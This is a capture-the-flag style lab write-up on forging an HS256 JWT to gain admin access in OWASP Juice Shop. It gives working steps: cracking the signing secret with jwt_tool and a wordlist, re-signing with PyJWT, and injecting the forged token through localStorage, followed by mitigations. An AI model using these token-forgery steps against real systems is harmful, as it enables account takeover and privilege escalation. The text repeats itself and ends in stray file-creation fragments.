# 🛡️ Attack Lab: JWT Token Manipulation – HS256 with Weak Secret

## 🎯 Objective

This lab demonstrates how to **forge a valid JSON Web Token (JWT)** to impersonate an administrative user (`admin@juice-sh.op`) by exploiting a misconfigured or weakly protected **HS256-signed** JWT implementation. The goal is to **escalate privileges** and gain unauthorized access to administrative resources by **cracking the HMAC secret** used to sign the JWT, then creating a custom, valid token.

---

## 🧠 Required Knowledge

To successfully perform this attack, a security researcher should understand:

### 🔸 JWT Structure
A JWT consists of three base64url-encoded components separated by periods:
<Header>.<Payload>.<Signature>

 ```Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImN1c3RvbUBqdWljZS5zaG9wIiwicm9sZSI6ImN1c3RvbWVyIn0.abc123signature
Header: Specifies the algorithm (alg) and token type (typ).
Example: { "alg": "HS256", "typ": "JWT" }

Payload: Contains claims such as the email, role, iat, etc.

Signature: HMAC-SHA256 hash of header + payload, signed using a shared secret.

🔸 HMAC vs RSA Algorithms
HS256 (HMAC-SHA256): Shared secret between client and server. If the secret is weak (e.g., secret, admin, 123456), the token can be forged.

RS256: Uses asymmetric key pairs. This attack does not work if RS256 is implemented securely.

🔸 Vulnerability Prerequisites
The JWT uses HS256 as the signing algorithm.

The server-side secret used for signing is weak, predictable, or leaked.

The backend accepts tokens solely based on signature validation and does not verify the user’s session server-side.

🛠️ Tools & Technologies
Tool	Usage
OWASP Juice Shop	Vulnerable web application
Kali Linux	Offensive security platform
Browser DevTools / Burp Suite	Inspect and intercept JWTs
jwt_tool.py	Automated JWT analyzer and attacker
PyJWT / jwt.io	Manual creation and verification of JWTs
SecLists	Wordlist of common secrets (for brute-forcing)

🧩 MITRE ATT&CK Mapping
Technique	ID	Description
Valid Accounts	T1078	Use of forged identity to access a system
Forge Web Token	T1606.002	Craft a signed token using known or weak secrets

📜 Step-by-Step Execution
🔹 1. Log in as a Normal User
Visit http://localhost:3000

Register or log in using a normal user account.

Example: customer@juice-sh.op / password123

Open DevTools → Application → LocalStorage → Copy the JWT token value.

Decode the JWT at jwt.io or using:

bash
Copy
Edit
echo "TOKEN" | cut -d "." -f1,2 | tr "." "\n" | base64 -d
🔹 2. Analyze the JWT
The payload will likely contain:

json
Copy
Edit
{
  "email": "customer@juice-sh.op",
  "role": "customer"
}
Check the header:

json
Copy
Edit
{
  "alg": "HS256",
  "typ": "JWT"
}
Since the algorithm is HS256, the token is signed using a shared secret. The goal is to brute-force this secret.

🔹 3. Crack the Secret Key
Use jwt_tool.py or a Python script with a wordlist to brute-force the signing secret:

🔸 Using jwt_tool.py
bash
Copy
Edit
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
-C: Crack mode

-d: Dictionary/wordlist path

If successful:

bash
Copy
Edit
[*] Secret found: 'admin'
🔹 4. Modify and Forge New Token
Generate a new token with elevated privileges:

🔸 Edit Payload
json
Copy
Edit
{
  "email": "admin@juice-sh.op",
  "role": "admin"
}
🔸 Sign New Token
Using jwt_tool.py:

bash
Copy
Edit
python3 jwt_tool.py <TOKEN> -S admin -I
Or with Python:

python
Copy
Edit
import jwt

secret = "admin"
payload = {
  "email": "admin@juice-sh.op",
  "role": "admin"
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
🔹 5. Replace and Access Admin Area
Open browser DevTools → LocalStorage

Replace the original token with the forged token

Refresh the application.

Navigate to /administration – admin-only content should now be available.

🔬 Post-Exploitation Observations
The server relied solely on JWT signature validation without re-verifying user roles.

The secret used to sign JWTs was predictable and easily crackable.

There was no token rotation or expiration, allowing persistent privilege escalation.

🛡️ Mitigation Strategies
Problem	Mitigation
Weak secret	Use a random, complex, high-entropy secret for signing JWTs
HS256 trust model	Prefer asymmetric keys (RS256) for better token verification
Token forgery	Verify roles/claims on the server-side for every request
Token longevity	Implement short-lived tokens + refresh mechanisms
JWT storage	Use HttpOnly, Secure cookies instead of LocalStorage

🧠 Final Thoughts
JWTs are a powerful way to manage stateless sessions, but when used with weak symmetric keys, they become a serious attack surface. This lab reinforces the importance of strong key management, server-side validation, and secure storage practices.

Security practitioners should always verify:

Token signing algorithm

Key strength and entropy

Trust boundaries of token content

This attack is commonly seen in:

Legacy applications using hardcoded JWT secrets

Developer environments with default secrets (secret, admin, etc.)

APIs using HS256 for production workloads without key rotation


# 🛡️ Attack: JWT Token Manipulation (HS256 with Weak Secret)

## 🎯 Objective
Forge a valid JWT token with `admin@juice-sh.op` identity and escalate privileges by exploiting weak or predictable signing secrets.

---

## 🧠 Required Knowledge

- JWT structure: `Header.Payload.Signature`
- HS256 (HMAC SHA-256) vs RS256 (RSA SHA-256)
- Token tampering and re-signing
- Tools: `jwt.io`, `jwt_tool.py`, or Python

---

## 🛠️ Tools & Technologies

- OWASP Juice Shop
- Kali Linux
- Browser DevTools / Burp Suite
- `jwt_tool.py`, `pyjwt`, or online encoders

---

## 🧩 MITRE ATT&CK Mapping

- **T1078** – Valid Accounts
- **T1606.002** – Forge Web Token

---

## 📜 Step-by-Step Execution

### 🔹 1. Login as a Normal User

Login:

Email: test@local.sh
Password: 123456


### 🔹 2. Grab the JWT Token

In browser DevTools → Console:
```js
localStorage.getItem('token');


3. Decode the Token
Use:

https://jwt.io

OR jwt_tool.py:

bash
Copy
Edit
jwt_tool.py <token> -d
🔹 4. Modify Payload
Change:

json
Copy
Edit
{
  "email": "admin@juice-sh.op",
  "role": "admin"
}
🔹 5. Sign New Token Using Weak Secret
Try secrets like:

secret

123456

jwtsecret

Or use jwt_tool.py to brute-force:

bash
Copy
Edit
jwt_tool.py <token> -C -d -p /usr/share/wordlists/rockyou.txt
Then:

bash
Copy
Edit
jwt_tool.py <token> -S secret -pc email=admin@juice-sh.op -pc role=admin
🔹 6. Inject Forged Token
In browser console:

js
Copy
Edit
localStorage.setItem("token", "<forged_token>");
Refresh page → You’re logged in as admin.

✅ Success Criteria
Able to access /#/administration

Scoreboard shows ✅ "Login with administrator account"

📸 POC

🛡️ Mitigation
Use strong, unpredictable JWT secrets

Prefer RS256 with private/public key pair

Validate role claims server-side

Implement short token expiry and revoke mechanisms

🔗 References
JWT.IO

PortSwigger JWT Attacks

Juice Shop GitHub

yaml
Copy
Edit

---

### 📋 Step 2: Create `TO-DO.md`

```bash
nano JWT-Token-Manipulation/TO-DO.md
Paste:

markdown
Copy
Edit
# ✅ TO-DO – JWT Token Manipulation

- [x] Login as normal user
- [x] Extract JWT from browser
- [x] Modify payload to admin
- [x] Sign token with weak secret (e.g., "secret")
- [x] Inject forged token
- [x] Confirm access to /#/administration
- [ ] Add forged token screenshot (optional)



